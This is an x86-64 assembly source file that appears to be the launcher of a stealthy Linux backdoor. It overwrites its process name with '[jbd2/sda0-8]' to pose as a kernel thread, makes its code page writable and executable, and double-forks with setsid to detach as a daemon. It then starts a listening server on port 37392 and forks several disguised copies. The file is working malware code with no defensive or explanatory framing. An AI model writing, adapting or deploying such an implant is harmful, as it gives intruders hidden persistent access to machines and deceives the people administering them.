BITS 64

section .text
    global _start
    extern create_server
    extern loop_server

_start:
    push    rbp
    mov     rbp, rsp
    mov     rdi, [rbp + 0x10]
    lea     rsi, [rel pname]
    call    strcpy
    lea     rdi, [$$]
    xor     rsi, rsi
    xor     rdx, rdx
    xor     eax, eax
    add     rsi, 0x1000
    add     rdx, 0x1 | 0x2 | 0x4 ; PROT_READ | PROT_WRITE | PROT_EXEC
    add     eax, 0xa ; mprotect
    syscall
    xor     eax, eax
    add     eax, 0x39 ; fork
    syscall
    cmp     rax, 0
    jne     exit
    xor     eax, eax
    add     eax, 0x70 ; setsid
    syscall
    xor     eax, eax
    add     eax, 0x39 ; fork
    syscall
    cmp     eax, 0
    jne     exit
    mov     rdi, DWORD 37392
    call    create_server
    xor     eax, eax
    add     eax, 0x39 ; fork
    syscall
    cmp     eax, 0
    jne     fork2
    mov     rax, [rbp + 0x10]
    mov     BYTE [rax + 0xb], 54
    jmp     connect
fork2:
    xor     eax, eax
    add     eax, 0x39 ; fork
    syscall
    cmp     eax, 0
    jne     connect
    mov     rax, [rbp + 0x10]
    mov     BYTE [rax + 0xb], 55
connect:
    call    loop_server

exit:
    xor     rdi, rdi
    xor     eax, eax
    add     eax, 0x3c ; exit
    syscall
    ret 

strcpy:
    mov     al, [rsi]
    mov     [rdi], al
    mov     bl, [rsi]
    cmp     bl, 0
    je      end_strcpy
    inc     rdi
    inc     rsi
    jmp     strcpy
end_strcpy:
    ret

    pname: db "[jbd2/sda0-8]", 0